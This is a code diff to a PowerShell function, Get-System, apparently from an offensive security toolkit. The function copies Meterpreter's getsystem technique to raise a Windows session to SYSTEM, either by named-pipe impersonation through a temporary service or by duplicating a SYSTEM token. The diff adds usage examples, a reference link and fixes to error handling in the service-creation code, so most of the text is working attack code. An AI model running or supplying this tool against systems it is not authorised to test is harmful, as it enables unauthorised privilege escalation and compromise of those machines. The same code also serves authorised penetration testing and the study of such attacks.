@@ -3,10 +3,10 @@ function Get-System {
     .SYNOPSIS
 
         GetSystem functionality inspired by Meterpreter's getsystem.
-        Uses named pipe impersonation or token duplication.
         'NamedPipe' impersonation doesn't need SeDebugPrivilege but does create
         a service, 'Token' duplications a SYSTEM token but needs SeDebugPrivilege.
-        NOTE: if running PowerShell 2.0
+        NOTE: if running PowerShell 2.0, start powershell.exe with '-STA' to ensure
+        token duplication works correctly.
 
         Author: @harmj0y, @mattifestation
         License: BSD 3-Clause
@@ -50,9 +50,22 @@ function Get-System {
 
         Uses token duplication to elevate the current thread token to SYSTEM.
 
+    .EXAMPLE
+        
+        PS> Get-System -WhoAmI
+
+        Displays the credentials for the current thread.
+
+    .EXAMPLE
+        
+        PS> Get-System -RevToSelf
+
+        Reverts the current thread privileges.
+
     .LINK
 
-        http://blog.cobaltstrike.com/2014/04/02/what-happens-when-i-type-getsystem/  
+        http://blog.cobaltstrike.com/2014/04/02/what-happens-when-i-type-getsystem/
+        http://clymb3r.wordpress.com/2013/11/03/powershell-and-token-impersonation/
 #>
     [CmdletBinding(DefaultParameterSetName = 'NamedPipe')]
     param(
@@ -191,7 +204,7 @@ function Get-System {
         $StartServiceA = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($StartServiceAAddr, $StartServiceADelegate)
 
         $DeleteServiceAddr = Get-ProcAddress Advapi32.dll DeleteService
-        $DeleteServiceDelegate = Get-DelegateType @( [IntPtr] ) ([Int])
+        $DeleteServiceDelegate = Get-DelegateType @( [IntPtr] ) ([IntPtr])
         $DeleteService = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DeleteServiceAddr, $DeleteServiceDelegate)
 
         $GetLastErrorAddr = Get-ProcAddress Kernel32.dll GetLastError
@@ -216,6 +229,7 @@ function Get-System {
             Write-Verbose "Creating new service: '$ServiceName'"
             try {
                 $ServiceHandle = $CreateServiceA.Invoke($ManagerHandle, $ServiceName, $ServiceName, 0xF003F, 0x10, 0x3, 0x1, $Command, $null, $null, $null, $null, $null)
+                $err = $GetLastError.Invoke()
             }
             catch {
                 Write-Warning "Error creating service : $_"
@@ -241,6 +255,7 @@ function Get-System {
                     # Step 5 - StartService()
                     Write-Verbose "Starting the service"
                     $val = $StartServiceA.Invoke($ServiceHandle, $null, $null)
+                    $err = $GetLastError.Invoke()
 
                     # if we successfully started the service, let it breathe and then delete it
                     if ($val -ne 0){
@@ -250,7 +265,6 @@ function Get-System {
                     }
                     else{
                         # error codes - http://msdn.microsoft.com/en-us/library/windows/desktop/ms681381(v=vs.85).aspx
-                        $err = $GetLastError.Invoke()
                         if ($err -eq 1053){
                             Write-Verbose "Command didn't respond to start"
                         }
@@ -265,10 +279,10 @@ function Get-System {
                     # Step 6 - DeleteService()
                     Write-Verbose "Deleting the service '$ServiceName'"
                     $val = $DeleteService.invoke($ServiceHandle)
-                    
+                    $err = $GetLastError.Invoke()
+
                     if ($val -eq 0){
                         # error codes - http://msdn.microsoft.com/en-us/library/windows/desktop/ms681381(v=vs.85).aspx
-                        $err = $GetLastError.Invoke()
                         Write-Warning "DeleteService failed, LastError: $err"
                     }
                     else{
@@ -280,16 +294,14 @@ function Get-System {
                     $val = $CloseServiceHandle.Invoke($ServiceHandle)
                     Write-Verbose "Service handle closed off"
                 }
-                else{
+                else {
                     # error codes - http://msdn.microsoft.com/en-us/library/windows/desktop/ms681381(v=vs.85).aspx
-                    $err = $GetLastError.Invoke()
                     Write-Warning "[!] OpenServiceA failed, LastError: $err"
                 }
             }
 
-            else{
+            else {
                 # error codes - http://msdn.microsoft.com/en-us/library/windows/desktop/ms681381(v=vs.85).aspx
-                $err = $GetLastError.Invoke()
                 Write-Warning "[!] CreateService failed, LastError: $err"
             }
 
@@ -297,9 +309,8 @@ function Get-System {
             Write-Verbose "Closing the manager handle"
             $Null = $CloseServiceHandle.Invoke($ManagerHandle)
         }
-        else{
+        else {
             # error codes - http://msdn.microsoft.com/en-us/library/windows/desktop/ms681381(v=vs.85).aspx
-            $err = $GetLastError.Invoke()
             Write-Warning "[!] OpenSCManager failed, LastError: $err"
         }
 
